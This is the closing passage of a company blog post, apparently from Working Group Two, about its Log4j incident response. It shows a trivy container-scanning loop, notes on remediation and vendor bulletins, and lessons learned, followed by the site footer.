</span><span class="token assign-left variable" style="color:rgb(191, 199, 213)">result</span><span class="token operator" style="color:rgb(137, 221, 255)">=</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token variable" style="color:rgb(191, 199, 213)">trivy image --severity CRITICAL $</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token variable" style="color:rgb(191, 199, 213)">img</span><span class="token variable punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token variable" style="color:rgb(191, 199, 213)">`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">if</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> </span><span class="token variable" style="color:rgb(191, 199, 213)">${result}</span><span class="token plain"> </span><span class="token operator" style="color:rgb(137, 221, 255)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">grep</span><span class="token plain"> -q </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">$1</span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">;</span><span class="token plain"> </span><span class="token keyword" style="font-style:italic">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token builtin class-name" style="color:rgb(255, 203, 107)">echo</span><span class="token plain"> -e </span><span class="token string" style="color:rgb(195, 232, 141)">&quot;</span><span class="token string variable" style="color:rgb(191, 199, 213)">${img}</span><span class="token string" style="color:rgb(195, 232, 141)"> is vulnerable, please patch!&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token keyword" style="font-style:italic">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain"></span><span class="token keyword" style="font-style:italic">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="monitoring-vendors">Monitoring Vendors<a href="#monitoring-vendors" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h3><p>It is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-worked-well-and-could-be-improved">What worked well and could be improved<a href="#what-worked-well-and-could-be-improved" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h2><p>During this incident management we have gathered great learnings in the way.</p><p>First of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process.</p><p>Second, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="staying-secure">Staying secure<a href="#staying-secure" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h2><p>All in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="we-are-hiring">We are hiring<a href="#we-are-hiring" class="hash-link" aria-label="Direct link to heading" title="Direct link to heading">​</a></h2><p>If you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. <a href="/jp/careers/">www.wgtwo.com/careers</a></p></div><footer class="row docusaurus-mt-lg"><div class="col col--9"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/jp/blog/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/jp/blog/tags/infrastructure/">infrastructure</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/jp/blog/tags/vulnerability/">vulnerability</a></li></ul></div><div class="col sharingSection_o4gn col--3"><button aria-haspopup="true" aria-expanded="false" type="button" class="szh-menu-button sharingButton__GCX"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sharingIcon_aNi7"><path d="M4 12v8a2 2 0 002 2h12a2 2 0 002-2v-8"></path><polyline points="16 6 12 2 8 6"></polyline><line x1="12" y1="2" x2="12" y2="15"></line></svg></button></div><div class="col margin-top--sm"><a href="https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2021-12-17-log4j-security-vulnerability.md" target="_blank" rel="noreferrer noopener" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/jp/blog/the-specs-behind-the-specs-part-1/"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">The specs behind the specs part 1</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/jp/blog/ckh-iod-wg2-public-cloud/"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">CKH IOD selects Working Group Two for public cloud core network</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#friday" class="table-of-contents__link toc-highlight">Friday</a><ul><li><a href="#code" class="table-of-contents__link toc-highlight">Code</a></li><li><a href="#docker-vulnerability-scan-day-1" class="table-of-contents__link toc-highlight">Docker Vulnerability Scan Day 1</a></li></ul></li><li><a href="#saturday" class="table-of-contents__link toc-highlight">Saturday</a><ul><li><a href="#checking-our-infrastructure-ourselves-with-dns-requests" class="table-of-contents__link toc-highlight">Checking our infrastructure ourselves with DNS requests</a></li><li><a href="#log-analysis-and-alerting" class="table-of-contents__link toc-highlight">Log Analysis and Alerting</a></li></ul></li><li><a href="#monday" class="table-of-contents__link toc-highlight">Monday</a><ul><li><a href="#docker-vulnerability-scans" class="table-of-contents__link toc-highlight">Docker Vulnerability Scans</a></li><li><a href="#monitoring-vendors" class="table-of-contents__link toc-highlight">Monitoring Vendors</a></li></ul></li><li><a href="#what-worked-well-and-could-be-improved" class="table-of-contents__link toc-highlight">What worked well and could be improved</a></li><li><a href="#staying-secure" class="table-of-contents__link toc-highlight">Staying secure</a></li><li><a href="#we-are-hiring" class="table-of-contents__link toc-highlight">We are hiring</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Product</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://docs.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item">API Docs<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://console.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item">Console Login<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/implementation/">Implementation</a></li><li class="footer__item"><a href="https://support.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item">Customer Support<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/privacy/">Privacy Notice</a></li></ul></div><div class="col footer__col"><div class="footer__title">Company</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/docs/about/introduction/">About</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/blog/">Blog</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/docs/case-studies/mvnx/">Case Studies</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/team/">Team</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/terms-of-use/">Terms of Use</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/careers/">Careers</a></li><li class="footer__item"><a href="https://www.wgtwo.com/jp" target="_blank" rel="noopener noreferrer" class="footer__link-item">wgtwo.com/jp 合同会社<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Security</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/security/">Security Overview</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/docs/technology/security-whitepaper/">Security Whitepaper</a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/security/responsible-disclosure/">Responsible Disclosure</a></li><li class="footer__item"><a href="https://trust.wgtwo.com" target="_blank" rel="noopener noreferrer" class="footer__link-item">Trust Report<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">Connect</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/docs/about/media-and-analysts/">Media &amp; Analysts</a></li><li class="footer__item"><a href="https://www.youtube.com/@workinggrouptwo2286" target="_blank" rel="noopener noreferrer" class="footer__link-item">YouTube<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://twitter.com/workinggrouptwo" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://github.com/working-group-two" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://linkedin.com/company/wgtwo" target="_blank" rel="noopener noreferrer" class="footer__link-item">LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a class="footer__link-item" target="_self" href="/jp/contact/">Contact Us</a></li></ul></div></div><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a class="footerLogoLink_BH7S" href="/jp/"><img src="/jp/img/logo_white.svg" alt="wgtwo Logo" class="themedImage_ToTc themedImage--light_HNdA footer__logo" width="191px" height="32px"><img src="/jp/img/logo_white.svg" alt="wgtwo Logo" class="themedImage_ToTc themedImage--dark_i4oU footer__logo" width="191px" height="32px"></a></div><div class="footer__copyright">© 2022 Working Group Two AS</div></div></div></footer></div>
<script src="/jp/assets/js/runtime~main.af9a854b.js"></script>
<script src="/jp/assets/js/main.26f7d5ce.js"></script>
<!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N4969FH" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) --></body>
</html>